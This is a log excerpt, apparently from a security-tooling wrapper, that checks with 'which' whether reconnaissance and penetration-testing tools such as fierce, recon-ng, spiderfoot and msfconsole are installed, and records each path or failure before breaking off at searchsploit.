2025-10-24 06:15:12,535 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,535 - __main__ - INFO - 🆔 PROCESS: PID 3368 started
2025-10-24 06:15:12,535 - __main__ - INFO - 🆔 REGISTERED: Process 3368 - which fierce...
2025-10-24 06:15:12,536 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3368
2025-10-24 06:15:12,538 - __main__ - INFO - 📤 STDOUT: /usr/bin/fierce
2025-10-24 06:15:12,540 - __main__ - INFO - 🧹 CLEANUP: Process 3368 removed from registry
2025-10-24 06:15:12,540 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,540 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,540 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,540 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,540 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which fierce
2025-10-24 06:15:12,541 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,541 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,541 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,541 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,541 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,541 - __main__ - INFO - 💾 Cached result for command: which fierce
2025-10-24 06:15:12,541 - __main__ - INFO - 🔍 Cache MISS for command: which dnsenum
2025-10-24 06:15:12,541 - __main__ - INFO - 🚀 EXECUTING: which dnsenum
2025-10-24 06:15:12,541 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,541 - __main__ - INFO - 🆔 PROCESS: PID 3373 started
2025-10-24 06:15:12,541 - __main__ - INFO - 🆔 REGISTERED: Process 3373 - which dnsenum...
2025-10-24 06:15:12,542 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3373
2025-10-24 06:15:12,543 - __main__ - INFO - 📤 STDOUT: /usr/bin/dnsenum
2025-10-24 06:15:12,545 - __main__ - INFO - 🧹 CLEANUP: Process 3373 removed from registry
2025-10-24 06:15:12,545 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,545 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,545 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,545 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,545 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dnsenum
2025-10-24 06:15:12,545 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,545 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,545 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,545 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,545 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,545 - __main__ - INFO - 💾 Cached result for command: which dnsenum
2025-10-24 06:15:12,545 - __main__ - INFO - 🔍 Cache MISS for command: which theharvester
2025-10-24 06:15:12,545 - __main__ - INFO - 🚀 EXECUTING: which theharvester
2025-10-24 06:15:12,545 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,546 - __main__ - INFO - 🆔 PROCESS: PID 3378 started
2025-10-24 06:15:12,546 - __main__ - INFO - 🆔 REGISTERED: Process 3378 - which theharvester...
2025-10-24 06:15:12,547 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3378
2025-10-24 06:15:12,548 - __main__ - INFO - 📤 STDOUT: /usr/bin/theharvester
2025-10-24 06:15:12,550 - __main__ - INFO - 🧹 CLEANUP: Process 3378 removed from registry
2025-10-24 06:15:12,550 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,550 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,550 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,550 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,550 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which theharvester
2025-10-24 06:15:12,550 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,550 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,550 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,550 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,550 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,550 - __main__ - INFO - 💾 Cached result for command: which theharvester
2025-10-24 06:15:12,550 - __main__ - INFO - 🔍 Cache MISS for command: which sherlock
2025-10-24 06:15:12,550 - __main__ - INFO - 🚀 EXECUTING: which sherlock
2025-10-24 06:15:12,551 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,551 - __main__ - INFO - 🆔 PROCESS: PID 3383 started
2025-10-24 06:15:12,551 - __main__ - INFO - 🆔 REGISTERED: Process 3383 - which sherlock...
2025-10-24 06:15:12,551 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3383
2025-10-24 06:15:12,553 - __main__ - INFO - 📤 STDOUT: /usr/bin/sherlock
2025-10-24 06:15:12,555 - __main__ - INFO - 🧹 CLEANUP: Process 3383 removed from registry
2025-10-24 06:15:12,555 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,555 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,555 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,555 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,555 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sherlock
2025-10-24 06:15:12,555 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,555 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,555 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,555 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,555 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,556 - __main__ - INFO - 💾 Cached result for command: which sherlock
2025-10-24 06:15:12,556 - __main__ - INFO - 🔍 Cache MISS for command: which social-analyzer
2025-10-24 06:15:12,556 - __main__ - INFO - 🚀 EXECUTING: which social-analyzer
2025-10-24 06:15:12,556 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,556 - __main__ - INFO - 🆔 PROCESS: PID 3388 started
2025-10-24 06:15:12,556 - __main__ - INFO - 🆔 REGISTERED: Process 3388 - which social-analyzer...
2025-10-24 06:15:12,557 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3388
2025-10-24 06:15:12,560 - __main__ - INFO - 🧹 CLEANUP: Process 3388 removed from registry
2025-10-24 06:15:12,560 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:12,560 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,560 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,560 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,560 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which social-analyzer
2025-10-24 06:15:12,560 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,560 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,560 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,560 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,560 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,560 - __main__ - INFO - 🔍 Cache MISS for command: which recon-ng
2025-10-24 06:15:12,560 - __main__ - INFO - 🚀 EXECUTING: which recon-ng
2025-10-24 06:15:12,560 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,561 - __main__ - INFO - 🆔 PROCESS: PID 3393 started
2025-10-24 06:15:12,561 - __main__ - INFO - 🆔 REGISTERED: Process 3393 - which recon-ng...
2025-10-24 06:15:12,561 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3393
2025-10-24 06:15:12,563 - __main__ - INFO - 📤 STDOUT: /usr/bin/recon-ng
2025-10-24 06:15:12,566 - __main__ - INFO - 🧹 CLEANUP: Process 3393 removed from registry
2025-10-24 06:15:12,566 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,566 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,566 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,566 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,566 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which recon-ng
2025-10-24 06:15:12,566 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,566 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,566 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,566 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,566 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,566 - __main__ - INFO - 💾 Cached result for command: which recon-ng
2025-10-24 06:15:12,566 - __main__ - INFO - 🔍 Cache MISS for command: which maltego
2025-10-24 06:15:12,566 - __main__ - INFO - 🚀 EXECUTING: which maltego
2025-10-24 06:15:12,566 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,567 - __main__ - INFO - 🆔 PROCESS: PID 3398 started
2025-10-24 06:15:12,567 - __main__ - INFO - 🆔 REGISTERED: Process 3398 - which maltego...
2025-10-24 06:15:12,567 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3398
2025-10-24 06:15:12,569 - __main__ - INFO - 📤 STDOUT: /usr/bin/maltego
2025-10-24 06:15:12,572 - __main__ - INFO - 🧹 CLEANUP: Process 3398 removed from registry
2025-10-24 06:15:12,572 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,572 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,572 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,572 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,572 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which maltego
2025-10-24 06:15:12,572 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,572 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,572 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,572 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,572 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,572 - __main__ - INFO - 💾 Cached result for command: which maltego
2025-10-24 06:15:12,572 - __main__ - INFO - 🔍 Cache MISS for command: which spiderfoot
2025-10-24 06:15:12,572 - __main__ - INFO - 🚀 EXECUTING: which spiderfoot
2025-10-24 06:15:12,572 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,572 - __main__ - INFO - 🆔 PROCESS: PID 3403 started
2025-10-24 06:15:12,572 - __main__ - INFO - 🆔 REGISTERED: Process 3403 - which spiderfoot...
2025-10-24 06:15:12,573 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3403
2025-10-24 06:15:12,575 - __main__ - INFO - 📤 STDOUT: /usr/bin/spiderfoot
2025-10-24 06:15:12,578 - __main__ - INFO - 🧹 CLEANUP: Process 3403 removed from registry
2025-10-24 06:15:12,578 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,578 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,578 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,578 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,578 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which spiderfoot
2025-10-24 06:15:12,578 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,578 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,578 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,578 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,578 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,578 - __main__ - INFO - 💾 Cached result for command: which spiderfoot
2025-10-24 06:15:12,578 - __main__ - INFO - 🔍 Cache MISS for command: which shodancli
2025-10-24 06:15:12,578 - __main__ - INFO - 🚀 EXECUTING: which shodancli
2025-10-24 06:15:12,578 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,579 - __main__ - INFO - 🆔 PROCESS: PID 3408 started
2025-10-24 06:15:12,579 - __main__ - INFO - 🆔 REGISTERED: Process 3408 - which shodancli...
2025-10-24 06:15:12,579 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3408
2025-10-24 06:15:12,581 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/shodancli
2025-10-24 06:15:12,583 - __main__ - INFO - 🧹 CLEANUP: Process 3408 removed from registry
2025-10-24 06:15:12,583 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,583 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,584 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,584 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,584 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which shodancli
2025-10-24 06:15:12,584 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,584 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 06:15:12,584 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,584 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,584 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,584 - __main__ - INFO - 💾 Cached result for command: which shodancli
2025-10-24 06:15:12,584 - __main__ - INFO - 🔍 Cache MISS for command: which censys-cli
2025-10-24 06:15:12,584 - __main__ - INFO - 🚀 EXECUTING: which censys-cli
2025-10-24 06:15:12,584 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,584 - __main__ - INFO - 🆔 PROCESS: PID 3413 started
2025-10-24 06:15:12,584 - __main__ - INFO - 🆔 REGISTERED: Process 3413 - which censys-cli...
2025-10-24 06:15:12,585 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3413
2025-10-24 06:15:12,589 - __main__ - INFO - 🧹 CLEANUP: Process 3413 removed from registry
2025-10-24 06:15:12,589 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,589 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,589 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,589 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,590 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which censys-cli
2025-10-24 06:15:12,590 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,590 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,590 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,590 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,590 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,590 - __main__ - INFO - 🔍 Cache MISS for command: which have-i-been-pwned
2025-10-24 06:15:12,590 - __main__ - INFO - 🚀 EXECUTING: which have-i-been-pwned
2025-10-24 06:15:12,590 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,590 - __main__ - INFO - 🆔 PROCESS: PID 3418 started
2025-10-24 06:15:12,590 - __main__ - INFO - 🆔 REGISTERED: Process 3418 - which have-i-been-pwned...
2025-10-24 06:15:12,591 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3418
2025-10-24 06:15:12,597 - __main__ - INFO - 🧹 CLEANUP: Process 3418 removed from registry
2025-10-24 06:15:12,597 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,597 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,597 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,597 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,597 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which have-i-been-pwned
2025-10-24 06:15:12,597 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,597 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,597 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,597 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,597 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,597 - __main__ - INFO - 🔍 Cache MISS for command: which metasploit
2025-10-24 06:15:12,597 - __main__ - INFO - 🚀 EXECUTING: which metasploit
2025-10-24 06:15:12,598 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,598 - __main__ - INFO - 🆔 PROCESS: PID 3423 started
2025-10-24 06:15:12,598 - __main__ - INFO - 🆔 REGISTERED: Process 3423 - which metasploit...
2025-10-24 06:15:12,599 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3423
2025-10-24 06:15:12,605 - __main__ - INFO - 🧹 CLEANUP: Process 3423 removed from registry
2025-10-24 06:15:12,605 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,605 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,605 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,605 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,605 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which metasploit
2025-10-24 06:15:12,605 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,605 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,605 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,605 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,605 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,605 - __main__ - INFO - 🔍 Cache MISS for command: which msfconsole
2025-10-24 06:15:12,605 - __main__ - INFO - 🚀 EXECUTING: which msfconsole
2025-10-24 06:15:12,605 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,606 - __main__ - INFO - 🆔 PROCESS: PID 3428 started
2025-10-24 06:15:12,606 - __main__ - INFO - 🆔 REGISTERED: Process 3428 - which msfconsole...
2025-10-24 06:15:12,606 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3428
2025-10-24 06:15:12,611 - __main__ - INFO - 📤 STDOUT: /usr/bin/msfconsole
2025-10-24 06:15:12,618 - __main__ - INFO - 🧹 CLEANUP: Process 3428 removed from registry
2025-10-24 06:15:12,619 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,619 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,619 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,619 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,619 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which msfconsole
2025-10-24 06:15:12,619 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,619 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,619 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,619 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,619 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,619 - __main__ - INFO - 💾 Cached result for command: which msfconsole
2025-10-24 06:15:12,619 - __main__ - INFO - 🔍 Cache MISS for command: which exploit-db
2025-10-24 06:15:12,619 - __main__ - INFO - 🚀 EXECUTING: which exploit-db
2025-10-24 06:15:12,619 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,619 - __main__ - INFO - 🆔 PROCESS: PID 3433 started
2025-10-24 06:15:12,619 - __main__ - INFO - 🆔 REGISTERED: Process 3433 - which exploit-db...
2025-10-24 06:15:12,620 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3433
2025-10-24 06:15:12,622 - __main__ - INFO - 📤 STDOUT: /usr/bin/exploit-db
2025-10-24 06:15:12,624 - __main__ - INFO - 🧹 CLEANUP: Process 3433 removed from registry
2025-10-24 06:15:12,624 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,624 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,624 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,625 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,625 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which exploit-db
2025-10-24 06:15:12,625 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,625 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,625 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,625 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,625 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,625 - __main__ - INFO - 💾 Cached result for command: which exploit-db
2025-10-24 06:15:12,625 - __main__ - INFO - 🔍 Cache MISS for command: which searchsploit
2025-10-24 06:15:12,625 - __main__ - INFO - 🚀 EXECUTING: which searchsploit
2025-10-24 06:15:12,625 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
